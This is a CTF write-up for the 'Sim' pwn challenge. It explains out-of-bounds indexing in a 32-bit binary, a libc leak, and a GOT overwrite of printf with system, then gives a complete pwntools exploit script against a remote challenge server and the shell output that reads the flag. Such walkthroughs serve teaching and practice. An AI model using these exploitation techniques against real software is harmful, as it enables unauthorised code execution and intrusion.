# Sim

**Description**:  
Welcome back `Agent 007`! As you can see, the simulator is running an arc right now. But the arc seems to be in a meltdown. Can you break its security with its own computational power and save it?

**Author:  [Ath3n1x](https://twitter.com/Ath3n1x)**

**Solution**: 
This seems to be the last challenge where Agent 007 will be back. 
You know the drill by now, `Checksec`:
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8046000)
    RUNPATH:  b'.'
```

`Partial RELRO` opens up the possibility of GOT overwrite. 
For a change, this is also a 32 bit binary contrary to the 64 bit binaries that we encountered in the challenges thus far. So the addresses are going to be 4 bytes. 
`No PIE`, which means that the addess of the GOT table remains the same.

On running the binary, we can see that we have 3 options: ``add`, `show`, `break_armour``. All manipulates the reactor which is a global array declared as: `char *reactor[3][4]`. 


Now looking at the source code:

```C
void add(){

	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	puts("Enter the data :");
	read(0,reactor[idx],0x4);
		
}
```

`idx` is signed. Integer overflow is a possibility which allows negative indexing. Also, we can allocate/write anything at `reactor+idx`. This is particularly dangerous because we can modify the contents of the reactor array at any position specified by idx. If negative values are permitted, we could potentially overwrite critical areas of memory, such as the Global Offset Table (GOT), since both reactor and the GOT are stored in the BSS segment. By calculating the correct offset, we could overwrite a GOT entry with the address of the `libc system` function. This would allow us to hijack the program's execution flow and ultimately gain a shell.


```C
void show(){
	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	if(reactor[idx])
		printf("%s\n",reactor[idx]);
	else
		puts("Not allocated!");
}
```

There is no check in `idx`. This can be exploited to print the data stored at `reactor+(-idx)` location. 

We can use the above to get more consistent `libc` leaks (addresses get randomized on each run due to ASLR). Then we can calculate the `system` address from the leaks. At last, we can overwrite GOT table entry of `printf` with the address (system) that we calculated. 


```C
	else if(choice == 3)
		{
		    printf(break_);
		}
```
*[In main]*
When the choice is 3, `printf(break_);` gets executed. So what if `break_` is `/bin/sh`? Viola! There pops the shell.

Note: Alternatively, you can also make use of the format string vulnerability in the `printf(break_)` to get the required leaks.

```python=
from pwn import *
#p = process("./sim")

p = remote('13.234.11.113',32651)

def add(idx,data):
    p.sendlineafter("MELTDOWN)\n","1")
    p.sendlineafter("index :\n",str(idx))
    p.sendlineafter("data :\n",data)

def show(idx):
    p.sendlineafter("MELTDOWN)\n","2")
    
    p.sendlineafter("Enter the index :\n",str(idx))
def leave():
    p.sendlineafter("MELTDOWN)\n","3")

p.sendline("/bin/sh\x00")
show("268435454")

print("leaks:")
leak = u32(p.recvline()[:4].strip().ljust(4,b'\x00'))
print(hex(leak))
base = leak - 0x1d55c0
system = base + 0x3ce10
print("System address:", hex(system))
add("268435449", p32(system))

#gdb.attach(p)

leave()
p.interactive()
```

On running the script:
```
[*] Switching to interactive mode
Choose your ACTION:
1. add
2. show
3. break armour
$ ls
Dockerfile  flag.txt  ld-2.27.so  libc-2.27.so    libc.so.6  sim    sim.py    ynetd
$ cat flag.txt
shaktiCTF{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}
$ exit
```
 
Flag: `shaktictf{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}`              
